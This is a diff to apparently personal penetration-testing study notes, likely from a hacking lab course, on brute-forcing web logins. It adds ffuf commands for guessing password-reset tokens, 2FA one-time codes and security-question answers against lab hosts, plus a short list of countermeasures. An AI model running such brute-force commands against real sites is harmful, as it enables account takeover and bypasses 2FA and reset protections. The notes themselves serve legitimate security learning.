@@ -41,6 +41,10 @@ cookster
 
 #### Brute-forcring passwords of users
 Also see: [[Login bruteforce]] 
+
+Before attacking with a bruteforce attack, it can be smart to test for default credentials first. Can google after them or use spesiffic wordlist for default creds (seclist)
+
+
 - Once we know some usernames, we can try to bruteforce the password. We prefer a tailored wordlist - for example tailor it to the company password policy. 
 - Wordlist should be as short and fitting as possible 
 
@@ -62,3 +66,23 @@ If we know a password reset has been invoked, then we can try bruteforce the res
 ```shell
 ffuf -w tokens.txt -u http://154.57.164.80:32519/reset_password.php?token=FUZZ -fr "The provided token is invalid"
 ```
+
+#### Brute forcing 2FA codes
+Similar idea to the last one, we can brute force all combinations of a simple otp if they do not limit our requests.
+
+```shell
+ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
+```
+- Note: we need to include the session token from the successful login. 
+
+#### Counter against bruteforce:
+- Rate limiting 
+- CAPTCHAs 
+
+#### Attacking password reset functionalities
+Some sites have a password reset functionality that only require us to know the username and answer a security password, this can be exploited if the user has a easy to guess answer. ex. what city were you born can be OSINTed or bruteforced. 
+
+```shell
+ffuf -w ./city_wordlist.txt -u http://154.57.164.73:32364/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=u3q5h1f41pvsdukae7o1aq3bse" -d "security_response=FUZZ" -fr "Incorrect response."
+```
+
